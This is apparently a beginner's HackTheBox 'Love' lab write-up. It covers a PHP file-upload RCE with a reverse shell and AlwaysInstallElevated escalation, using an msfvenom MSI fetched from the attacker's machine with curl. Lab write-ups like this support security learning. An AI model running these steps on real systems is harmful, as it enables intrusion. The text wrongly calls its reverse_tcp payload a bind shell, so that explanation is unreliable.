Love is an easy level box on HackTheBox and took quite some time for me to solve as it was the second box that I have tried to solve. It was pretty interesting to solve and I learned some new exploit methods that I could try to use later. I utilized an Unauthenticated RCE exploit on the application the website was running to gain a foothold, and then used AlwaysInstallElevated to gain System.

# Walkthrough
First I performed an nmap scan using `nmap -p- <box ip>`. This first identifies the ports in use. You can follow this up with `nmap -sV -sC -A --script=vuln <box ip> -p x,y,z > file.txt` to get a more indepth scan of those running ports and the system itself, but I was too lazy to do that. This second command will also write the results of the scan to a `file.txt` in your current directory so you could reference the scan again later, if necessary. The result of my initial nmap scan showed me that http was running:

Accessing the website I notice that it's titled "Voting System using PHP", so I try to find out if theres an existing exploit for it.

<br />
<br />
Accessing the exploit-db link shows an exploit that I can use. Based on the title, it's an exploit for unauthenticated remote code execution, meaning that if it works, I can execute code on the web server without needed any sort of credentials. Further explanation on the vulnerability can be found at:  https://www.cybersecurity-help.cz/vdb/SB2021050511. According to this resource, Unauthenticated RCE is achieved through uploading php files that will be run by the server and stored at the `/images/`directory. The exploit is a in the form of a HTTP POST request

Reading this post request, if I change the php code being used as the payload (near the bottom, between the angle brackets), I could potentially send a php code for a reverse shell. I decided to use  https://www.revshells.com to generate a PHP Ivan Sincek reverse shell under the IP of my machine and port 4444 (personal preference). I copy and pasted the shell generated from the site and replaced the payload. After sending the post request in Burp, I checked to see it worked.

Note that I replaced the red `//` in the burp picture with the Ivan Sincek php code. And we can see that it worked. All we have to do now is set up a listener on port 4444 and click the the link to our php code in the `/images/` directory. I set up a listener by running `nc -nvlp 4444` and then clicking `a.php` gives me:

Sweet, and we're in a Windows machine. Let's check something simple; is AlwaysInstallElevated on? What this policy does is that, if it's on (we can check the registry), it will install any `.msi` files with SYSTEM level privileges. Running the `REG QUERY HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` will tell us if its enabled.

<br />
<br />
The 0x1 means that the policy is turned on. It's too lit. To abuse this, we can create a malicious msi file that will give us a bind shell, granting us remote access of the machine. Whereas in a remote shell we open a port on our attacking machine and the victim connects to us, a bind shell will have a port open up on the victim while we connect to it. This sounds complicated, but we can use msfvenom to generate it very easily. Running the command `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip> LPORT=<port>-f msi > robux.msi` will create the payload.

<br />
<br />
We can then set up a http server on our machine that our victim will access to download the file using curl. Run `python3 -m http.server` and `curl <my machine ip>:<port number><path to payload> --output <filename>` on the respective machines. I ran `curl`  in the `\images` so I could just refresh the webpage to see if my payload was uploaded (however you could just use `dir` to check on the reverse shell)

<br />
Now lets check if our payload is there.

Robux op. Before we run this, we have to remember that we're using a bind shell so we have to connect to the listener that will be active once we run our payload. This can be done through metasploit and running the exploit `multi/handler` and setting our respective `LHOST` and `LPORT`.

<br />
<br />
Now lets run the msi file on the compromised host (we can just type out the filename and extension if its in our directory, or write the full path).
